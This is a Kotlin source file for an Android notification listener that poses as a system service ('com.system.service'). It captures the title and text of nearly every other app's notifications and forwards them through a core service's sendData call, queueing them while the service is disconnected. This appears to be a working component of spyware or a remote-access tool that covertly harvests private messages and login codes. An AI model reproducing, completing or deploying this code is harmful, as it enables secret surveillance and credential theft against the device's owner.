package com.system.service.monitors

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.system.service.core.CoreService
import org.json.JSONObject

class NotificationMonitor : NotificationListenerService() {

    // Packages to ignore (system noise)
    private val blocklist = setOf(
        "android", "com.android.systemui", "com.android.phone",
        "com.google.android.gms", "com.android.launcher3"
    )

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        if (sbn.packageName == packageName) return
        if (blocklist.contains(sbn.packageName)) return
        // Ignore ongoing (persistent) notifications like battery, USB etc.
        if (sbn.isOngoing) return

        try {
            val extras = sbn.notification.extras
            val title = extras.getString("android.title") ?: ""
            val text  = extras.getCharSequence("android.text")?.toString() ?: ""
            if (title.isEmpty() && text.isEmpty()) return

            val appName = try {
                packageManager.getApplicationLabel(
                    packageManager.getApplicationInfo(sbn.packageName, 0)
                ).toString()
            } catch (_: Exception) { sbn.packageName.substringAfterLast('.') }

            val data = JSONObject().apply {
                put("app",   appName)
                put("pkg",   sbn.packageName)
                put("title", title)
                put("text",  text)
                put("ts",    sbn.postTime)  // BUG #9 FIX: actual notification time
            }

            val service = CoreService.instance
            if (service != null) {
                service.sendData("notification", data)
            } else {
                // Queue it — CoreService will drain on connect
                pendingNotifications.add(data)
                if (pendingNotifications.size > 20) pendingNotifications.removeAt(0)
            }
        } catch (_: Exception) {}
    }

    companion object {
        // BUG FIX: mutableListOf (ArrayList) thread-safe nahi tha — multiple threads use karte hain
        val pendingNotifications: MutableList<JSONObject> = java.util.Collections.synchronizedList(mutableListOf())

        fun drainQueue() {
            val service = CoreService.instance ?: return
            // BUG FIX: synchronizedList individual ops ko safe banata hai lekin compound ops nahi.
            // toList() aur clear() ke beech mein naya notification add ho sakta tha — woh silently
            // drop ho jata tha. Ab synchronized block use karta hai taaki snapshot atomic ho.
            val snapshot: List<JSONObject>
            synchronized(pendingNotifications) {
                snapshot = pendingNotifications.toList()
                pendingNotifications.clear()
            }
            for (n in snapshot) {
                try { service.sendData("notification", n) } catch (_: Exception) {}
            }
        }
    }
}
